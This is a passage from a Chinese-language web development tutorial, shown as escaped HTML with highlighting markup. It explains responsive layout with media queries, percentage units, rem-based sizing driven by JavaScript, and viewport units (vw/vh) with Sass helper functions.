      background-color: yellow;
    }
}
/* ipad */
@media screen and (max-width: 768px) {
    aside {
      float: none;
      width: 100%;
      height: 10%;
      background-color: green;
    }
    main {
      height: calc(100vh - 10%);
      background-color: red;
    }
}
/* iphone6 7 8 plus */
@media screen and (max-width: 414px) {
    aside {
      float: none;
      width: 100%;
      height: 5%;
      background-color: yellow;
    }
    main {
      height: calc(100vh - 5%);
      background-color: red;
    }
}
/* iphoneX */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    aside {
      float: none;
      width: 100%;
      height: 10%;
      background-color: blue;
    }
    main {
      height: calc(100vh - 10%);
      background-color: red;
    }
}
/* iphone6 7 8 */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {
    aside {
      float: none;
      width: 100%;
      height: 3%;
      background-color: black;
    }
    main {
      height: calc(100vh - 3%);
      background-color: red;
    }
}
/* iphone5 */
@media screen and (max-width: 320px) {
    aside {
      float: none;
      width: 100%;
      height: 7%;
      background-color: green;
    }
    main {
      height: calc(100vh - 7%);
      background-color: red;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;</span>但是我们必须要弄清楚css中子元素的百分比到底是相对谁的百分比。直接上结论吧：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>或<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>中使用百分比，是相对于子元素的直接父元素，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>相对于父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>相对于父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>；子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>top<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>bottom<span class="nt">&lt;/code&gt;</span>如果设置百分比，则相对于直接非<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>static<span class="nt">&lt;/code&gt;</span>定位(默认定位)的父元素的高度，同样子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>left<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>right<span class="nt">&lt;/code&gt;</span>如果设置百分比，则相对于直接非<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>static<span class="nt">&lt;/code&gt;</span>定位(默认定位的)父元素的宽度；子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding<span class="nt">&lt;/code&gt;</span>如果设置百分比，不论是垂直方向或者是水平方向，都相对于直接父亲元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>，而与父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>无关。跟<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding<span class="nt">&lt;/code&gt;</span>一样，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>margin<span class="nt">&lt;/code&gt;</span>也是如此，子元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>margin<span class="nt">&lt;/code&gt;</span>如果设置成百分比，不论是垂直方向还是水平方向，都相对于直接父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>；<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>不一样，如果设置<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>为百分比，则是相对于自身的宽度，除了<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>外，还有比如<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>translate<span class="nt">&lt;/code&gt;</span>、<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>background-size<span class="nt">&lt;/code&gt;</span>等都是相对于自身的；<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>从上述对于百分比单位的介绍我们很容易看出如果全部使用百分比单位来实现响应式的布局，有明显的以下两个缺点：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>计算困难，如果我们要定义一个元素的宽度和高度，按照设计稿，必须换算成百分比单位。<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>可以看出，各个属性中如果使用百分比，相对父元素的属性并不是唯一的。比如<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>相对于父元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>width<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>height<span class="nt">&lt;/code&gt;</span>，而<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>margin<span class="nt">&lt;/code&gt;</span>、<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding<span class="nt">&lt;/code&gt;</span>不管垂直还是水平方向都相对比父元素的宽度、<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>border-radius<span class="nt">&lt;/code&gt;</span>则是相对于元素自身等等，造成我们使用百分比单位容易使布局问题变得复杂。<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"3rem布局"</span><span class="nt">&gt;</span>3.rem布局<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>REM<span class="nt">&lt;/code&gt;</span>是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS3<span class="nt">&lt;/code&gt;</span>新增的单位，并且移动端的支持度很高，Android2.x+,ios5+都支持。<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>单位都是相对于根元素html的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>来决定大小的,根元素的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>相当于提供了一个基准，当页面的size发生变化时，只需要改变<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>的值，那么以<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>为固定单位的元素的大小也会发生响应的变化。 因此，如果通过<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>来实现响应式的布局，只需要根据视图容器的大小，动态的改变<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>即可（而<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>em<span class="nt">&lt;/code&gt;</span>是相对于父元素的）。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>rem响应式的布局思想：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>一般不要给元素设置具体的宽度，但是对于一些小图标可以设定具体宽度值<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>高度值可以设置固定值，设计稿有多大，我们就严格有多大<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>所有设置的固定值都用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>做单位（首先在HTML总设置一个基准值：<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>px<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>的对应比例，然后在效果图上获取<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>px<span class="nt">&lt;/code&gt;</span>值，布局的时候转化为<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>值)<span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>js获取真实屏幕的宽度，让其除以设计稿的宽度，算出比例，把之前的基准值按照比例进行重新的设定，这样项目就可以在移动端自适应了<span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>rem布局的缺点：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>在响应式布局中，必须通过js来动态控制根元素<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>的大小，也就是说css样式和js代码有一定的耦合性，且必须将改变<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>的代码放在<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>css<span class="nt">&lt;/code&gt;</span>样式之前<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/*上述代码中将视图容器分为10份，font-size用十分之一的宽度来表示，最后在header标签中执行这段代码，就可以动态定义font-size的大小，从而1rem在不同的视觉容器中表示不同的大小，用rem固定单位可以实现不同容器内布局的自适应。*/
function refreshRem() {
    var docEl = doc.documentElement;
    var width = docEl.getBoundingClientRect().width;
    var rem = width / 10;
    docEl.style.fontSize = rem + 'px';
    flexible.rem = win.rem = rem;
}
win.addEventListener('resize', refreshRem);
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>REM<span class="nt">&lt;/code&gt;</span>布局也是目前多屏幕适配的最佳方式。默认情况下我们html标签的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>font-size<span class="nt">&lt;/code&gt;</span>为16px,我们利用媒体查询，设置在不同设备下的字体大小。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* pc width <span class="ni">&amp;gt;</span> 1100px */
html{ font-size: 100%;}
body {
    background-color: yellow;
    font-size: 1.5rem;
}
/* ipad pro */
@media screen and (max-width: 1024px) {
    body {
      background-color: #FF00FF;
      font-size: 1.4rem;
    }
}
/* ipad */
@media screen and (max-width: 768px) {
    body {
      background-color: green;
      font-size: 1.3rem;
    }
}
/* iphone6 7 8 plus */
@media screen and (max-width: 414px) {
    body {
      background-color: blue;
      font-size: 1.25rem;
    }
}
/* iphoneX */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    body {
      background-color: #0FF000;
      font-size: 1.125rem;
    }
}
/* iphone6 7 8 */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {
    body {
      background-color: #0FF000;
      font-size: 1rem;
    }
}
/* iphone5 */
@media screen and (max-width: 320px) {
    body {
      background-color: #0FF000;
      font-size: 0.75rem;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"4视口单位"</span><span class="nt">&gt;</span>4.视口单位<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>css3<span class="nt">&lt;/code&gt;</span>中引入了一个新的单位<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw/vh<span class="nt">&lt;/code&gt;</span>，与视图窗口有关，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>表示相对于视图窗口的宽度，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vh<span class="nt">&lt;/code&gt;</span>表示相对于视图窗口高度，除了<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vh<span class="nt">&lt;/code&gt;</span>外，还有<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vmin<span class="nt">&lt;/code&gt;</span>和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vmax<span class="nt">&lt;/code&gt;</span>两个相关的单位。各个单位具体的含义如下：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;thead&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;th&gt;</span>单位<span class="nt">&lt;/th&gt;</span>
      <span class="nt">&lt;th&gt;</span>含义<span class="nt">&lt;/th&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/thead&gt;</span>
  <span class="nt">&lt;tbody&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>相对于视窗的宽度，1vw 等于视口宽度的1%，即视窗宽度是100vw<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vh<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>相对于视窗的高度，1vh 等于视口高度的1%，即视窗高度是100vh<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vmin<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw和vh中的较小值<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vmax<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw和vh中的较大值<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/table&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fb9d770ad1553?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>用视口单位度量，视口宽度为100vw，高度为100vh（左侧为竖屏情况，右侧为横屏情况）。例如，在桌面端浏览器视口尺寸为650px，那么 1vw = 650 * 1% = 6.5px（这是理论推算的出，如果浏览器不支持0.5px，那么实际渲染结果可能是7px）。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>那么vw或者vh很类似百分比单位。vw和%的区别为：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;table&gt;</span>
  <span class="nt">&lt;thead&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;th&gt;</span>单位<span class="nt">&lt;/th&gt;</span>
      <span class="nt">&lt;th&gt;</span>含义<span class="nt">&lt;/th&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/thead&gt;</span>
  <span class="nt">&lt;tbody&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>%<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>大部分相对于祖先元素，也有相对于自身的情况比如（border-radius、translate等)<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
    <span class="nt">&lt;tr&gt;</span>
      <span class="nt">&lt;td&gt;</span>vw/vh<span class="nt">&lt;/td&gt;</span>
      <span class="nt">&lt;td&gt;</span>相对于视窗的尺寸<span class="nt">&lt;/td&gt;</span>
    <span class="nt">&lt;/tr&gt;</span>
  <span class="nt">&lt;/tbody&gt;</span>
<span class="nt">&lt;/table&gt;</span>

<span class="nt">&lt;p&gt;</span>从对比中我们可以发现，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>单位与百分比类似，单确有区别，前面我们介绍了百分比单位的换算困难，这里的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>更像”理想的百分比单位”。任意层级元素，在使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>单位的情况下，1vw都等于视图宽度的百分之一。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>使用视口单位来实现响应式有两种做法：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"1仅使用vw作为css单位"</span><span class="nt">&gt;</span>1.仅使用vw作为CSS单位<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>对于设计稿的尺寸转换为为单位，我们使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>Sass<span class="nt">&lt;/code&gt;</span>函数编译<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>//iPhone 6尺寸作为设计稿基准
$vm_base: 375; 
@function vw($px) {
    @return ($px / 375) * 100vw;
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>无论是文本还是布局宽度、间距等都使用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>作为单位<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.mod_nav {
    background-color: #fff;
    <span class="ni">&amp;amp;</span>_list {
        display: flex;
        padding: vm(15) vm(10) vm(10); // 内间距
        <span class="ni">&amp;amp;</span>_item {
            flex: 1;
            text-align: center;
            font-size: vm(10); // 字体大小
            <span class="ni">&amp;amp;</span>_logo {
                display: block;
                margin: 0 auto;
                width: vm(40); // 宽度
                height: vm(40); // 高度
                img {
                    display: block;
                    margin: 0 auto;
                    max-width: 100%;
                }
            }
            <span class="ni">&amp;amp;</span>_name {
                margin-top: vm(2);
            }
        }
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>1物理像素线（也就是普通屏幕下1px,高清屏幕下0.5px的情况）采用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>transform<span class="nt">&lt;/code&gt;</span>属性<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>scale<span class="nt">&lt;/code&gt;</span>实现<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.mod_grid {
    position: relative;
    <span class="ni">&amp;amp;</span>::after {
        // 实现1物理像素的下边框线
        content: '';
        position: absolute;
        z-index: 1;
        pointer-events: none;
        background-color: #ddd;
        height: 1px;
        left: 0;
        right: 0;
        top: 0;
        @media only screen and (-webkit-min-device-pixel-ratio: 2) {
            -webkit-transform: scaleY(0.5);
            -webkit-transform-origin: 50% 0%;
        }
    }
    ...
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>对于需要保持宽高比的图，应该用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>padding-top<span class="nt">&lt;/code&gt;</span>实现<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>.mod_banner {
    position: relative;
    padding-top: percentage(100/700); // 使用padding-top
    height: 0;
    overflow: hidden;
    img {
        width: 100%;
        height: auto;
        position: absolute;
        left: 0;
        top: 0; 
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h5</span> <span class="na">id=</span><span class="s">"2搭配vw和rem"</span><span class="nt">&gt;</span>2.搭配vw和rem<span class="nt">&lt;/h5&gt;</span>

<span class="nt">&lt;p&gt;</span>虽然采用<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>适配后的页面效果很好，但是它是利用视口单位实现的布局，依赖视口大小而自动缩放，无论视口过大还是过小，它也随着时候过大或者过小，失去了最大最小宽度的限制，此时我们可以结合<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>rem<span class="nt">&lt;/code&gt;</span>来实现布局<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;ul&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>给根元素大小设置随着视口变化而变化的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>vw<span class="nt">&lt;/code&gt;</span>单位，这样就可以实现动态改变其大小<span class="nt">&lt;/p&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
  <span class="nt">&lt;li&gt;</span>
    <span class="nt">&lt;p&gt;</span>限制根元素字体大小的最大最小值，配合<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>body<span class="nt">&lt;/code&gt;</span>加上最大宽度和最小宽度<span class="nt">&lt;/p&gt;</span>

    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>// rem 单位换算：定为 75px 只是方便运算，750px-75px、640-64px、1080px-108px，如此类推
$vm_fontsize: 75; // iPhone 6尺寸的根元素大小基准值
@function rem($px) {
     @return ($px / $vm_fontsize ) * 1rem;
}
// 根元素大小使用 vw 单位
$vm_design: 750;
html {
    font-size: ($vm_fontsize / ($vm_design / 2)) * 100vw; 
    // 同时，通过Media Queries 限制根元素最大最小值
    @media screen and (max-width: 320px) {
        font-size: 64px;
    }
    @media screen and (min-width: 540px) {
        font-size: 108px;
    }
}
// body 也增加最大最小宽度限制，避免默认100%宽度的 block 元素跟随 body 而过大过小
body {
    max-width: 540px;
    min-width: 320px;
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</span>    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/li&gt;</span>
<span class="nt">&lt;/ul&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"5图片响应式"</span><span class="nt">&gt;</span>5.图片响应式<span class="nt">&lt;/h3&gt;</span>

